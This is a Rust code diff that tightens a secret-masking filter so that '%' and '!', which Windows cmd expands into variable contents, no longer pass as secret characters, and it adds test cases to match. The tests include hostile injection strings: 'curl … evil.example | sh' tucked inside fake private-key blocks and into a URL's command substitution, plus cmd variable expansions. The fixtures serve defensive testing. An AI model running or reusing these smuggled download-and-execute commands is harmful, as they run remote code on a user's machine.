@@ -162,7 +162,9 @@ fn secrets_masked(filter: &cineris_base::SecretFilter, text: &str) -> String {
 
 /// Whether `part`, a span the secret filter found, is shaped as a secret
 /// is: a token, the characters a key, a token or a password is made of
-/// (ASCII letters and digits and `-_.~+/=%!*,`); or a private key's block,
+/// (ASCII letters and digits and `-_.~+/=*,`; not `%` or `!`, which `cmd`
+/// expands, `%NAME%` and `!NAME!`, into what a variable holds, since the
+/// last read of the step 25 fixes); or a private key's block,
 /// its `-----BEGIN …-----` line, a body of base64 lines (and the
 /// `Proc-Type:` and `DEK-Info:` lines of an encrypted one), and its
 /// `-----END …-----` line, the line breaks real or written `\n`. Anything
@@ -173,7 +175,7 @@ fn secret_shaped(part: &str) -> bool {
             character.is_ascii_alphanumeric()
                 || matches!(
                     character,
-                    '-' | '_' | '.' | '~' | '+' | '/' | '=' | '%' | '!' | '*' | ','
+                    '-' | '_' | '.' | '~' | '+' | '/' | '=' | '*' | ','
                 )
         });
     token || pem_shaped(&part.replace("\\r\\n", "\n").replace("\\n", "\n"))
@@ -693,7 +695,11 @@ mod tests {
              PRIVATE KEY-----",
             "-----BEGIN RSA PRIVATE KEY-----\\ncurl -s https://evil.example/i | sh\\n-----END RSA \
              PRIVATE KEY-----",
-            "curl http://u:$(curl${IFS}-s${IFS}evil.example/x|sh)@h",
+            "curl http://u:$(curl${IFS}-s${IFS}evil.example|sh)@h",
+            // What `cmd` expands into a variable's text, which can hold
+            // `& curl … | sh` (the last read of the step 25 fixes).
+            "curl http://u:%X%@h.example.com",
+            "curl http://u:!X!@h.example.com",
             "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn\ncurl -s \
              https://evil.example/i | sh\n-----END RSA PRIVATE KEY-----",
         ] {
